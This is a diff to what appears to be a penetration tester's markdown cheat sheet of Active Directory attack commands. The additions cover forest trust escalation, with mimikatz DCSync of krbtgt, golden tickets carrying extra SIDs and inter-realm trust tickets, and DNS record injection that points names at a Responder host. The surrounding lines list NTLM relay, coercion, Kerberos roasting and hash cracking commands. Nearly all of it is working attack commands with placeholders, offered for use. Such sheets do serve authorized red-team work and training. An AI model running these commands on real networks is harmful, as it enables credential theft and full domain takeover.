@@ -51,8 +51,17 @@
         *   `dcomexec.py [AUTH_STRING] -object MMC20`
     *   Trust Escalations (Domain Admin)
         *   `nxc ldap [DC_IP] [AUTH_STRING] -M enum_trusts`
-        *   [Child-Forest](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/trust-sid-hijacking/) → SID History Attack
+        *   [Child-Forest](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/trust-sid-hijacking/)
+            *   `Get-DomainSID -Domain [CURRENT_DOMAIN]`
+            *   `Get-DomainSID -Domain [FOREST_DOMAIN]`
+            *   `lsadump::dcsync /dc:[CONTROLLER] /domain:[DOMAIN] /user:krbtgt`
+            *   `kerberos::golden /user:Administrator /domain:[CURRENT_DOMAIN] /sid:[CURRENT_SID] /sids:[ROOT_SID]-519 /krbtgt:[HASH] /ptt`
+            *   `lsadump::dcsync /domain:root.local /user:Administrator`
         *   [Cross-Forest](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/trust-ticket/)
+            *   `lsadump::lsa /patch`
+            *   `kerberos::golden /user:Administrator /domain:[CURRENT_DOMAIN] /sid:[CURRENT_SID] /rc4:[HASH] /service:krbtgt /target:[FOREST] /ticket:forest_ticket.kirbi`
+            *   `.\asktgs.exe forest_ticket.kirbi CIFS/[FQDN_DC_OF_FOREST]`
+            *   `.\kirbirator.exe lsa [GENERATED_TGS_FILE]`
 *   SMB
     *   Null / Guest Binding
         *   `nxc smb [IP] -u '' -p ''`
@@ -82,10 +91,9 @@
         *   Enumeration
             *   `rpcclient -U '[USER]%[PASS]' [IP]`
             *   Queries
-                *   `enumdomusers`   → `queryuser  [USERNAME]` 
+                *   `enumdomusers`   → `queryuser  [USERNAME]` + `querydispinfo`
                 *   `enumdomgroups` → `querygroup [GROUP_NAME]`
-                *   `querydispinfo` / `enumprinters`
-                *   `querydominfo`   / `srvinfo` / `getdompwinfo`
+                *   `getdompwinfo` / `enumprinters` / `querydominfo`
     *   GPP / LAPS / GMSA Read
         *   `nxc smb  [IP] [AUTH_STRING] -M gpp_password`
         *   `nxc smb  [IP] [AUTH_STRING] --laps`
@@ -109,7 +117,7 @@
         *   LLMNR
             *   `respond()`
             *   Web Exploits                      → LFI / XXE / SSRF / SQLi
-            *   Phishing / Client Forms  → Responder Link / Bad-PDF / [NTLM\_Thef](https://github.com/Greenwolf/ntlm_theft) Office Files
+            *   Phishing / Client Forms  → Responder Link / Bad-PDF / Bad-ODT / [NTLM\_Thef](https://github.com/Greenwolf/ntlm_theft) Office Files
             *   Cracking                              → `hashcat -m 5600`
         *   Unsigned Relaying
             *   `respond()`                                                                              → Set `HTTP/SMB = Off`
@@ -119,19 +127,19 @@
         *   DHCPv6 Takeover
             *   `sudo mitm6 -I [NIC] -d [DOMAIN]`
             *   `ntlmrelayx.py -6 -wh fakewpad.[DOMAIN] -t ldap://[DC_IP]:[PORT]`
+        *   DNS Spoofing
+            *   `dnstool.py -u '[DOMAIN\USER]' -p [PASSWORD] [DC_IP] -a add -r [NAME] -d [RESPONDER_IP] -t A`
+            *   Passively Listen Hashes
         *   NTLM Coercion
             *   Check → `nxc smb [DC_IP] [AUTH_STRING] -M coerce_plus`
             *   Exploitation
                 *   `respond()` / NTLMRelayx Listener
                 *   `nxc smb [DC_IP] [AUTH_STRING] -M coerce_plus -o LISTENER=[RESPONDER_IP]` 
-*   LDAP
-    *   User Enumeration
-        *   `nxc ldap [DC_IP] [AUTH_STRING] --query "(sAMAccountType=805306368)" "sAMAccountName description memberOf"`
-        *   `ldeep [AUTH_STRING] -d [DOMAIN] -s ldap://[DC_IP] all [OUT_DIR]` → Full DB Dump + [Output Parsing](https://github.com/franc-pentest/ldeep)
-        *   KB Bruteforcing
-            *   Generate Users → `usergen() [FULL_NAMES.txt]` / [Statistically Likely](https://github.com/insidetrust/statistically-likely-usernames) / Seclists Xato-Net + `Names.txt`
-            *   `kerbrute userenum -d [DOMAIN] [GENERATED_USERS.txt] --dc [DC_IP] -d [DOMAIN]`
-    *   Domain Roasting
+*   KB
+    *   User Bruteforcing
+        *   Wordlists → `usergen() [FULL_NAMES.txt]` / [Statistically Likely](https://github.com/insidetrust/statistically-likely-usernames) / Seclists Xato-Net + `Names.txt`
+        *   `kerbrute userenum -d [DOMAIN] [GENERATED_USERS.txt] --dc [DC_IP]`
+    *   Roasting
         *   ASREP
             *   Try Both Techniques
             *   `nxc ldap [DC_IP] -u [VALID_USERS.txt] -p '' --asreproast --kdcHost [DOMAIN]`
@@ -142,6 +150,10 @@
             *   `nxc ldap              [DC_IP] [AUTH_STRING] --kerberoasting --kdcHost [DOMAIN]`
             *   `GetUserSPNs.py        [DOMAIN]/ -no-preauth [ASREP_USERNAME] -usersfile [VALID_USERS.txt] -dc-ip [DC_IP]`
             *   Cracking → `hashcat -m 13100`
+*   LDAP
+    *   User Enumeration
+        *   `nxc ldap [DC_IP] [AUTH_STRING] --query "(sAMAccountType=805306368)" "sAMAccountName description memberOf"`
+        *   `ldeep [AUTH_STRING] -d [DOMAIN] -s ldap://[DC_IP] all [OUT_DIR]` → Full DB Dump + [Output Parsing](https://github.com/franc-pentest/ldeep)
     *   Certificate Abuse
         *   [ESC Exploitations](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation)
         *   Enumeration
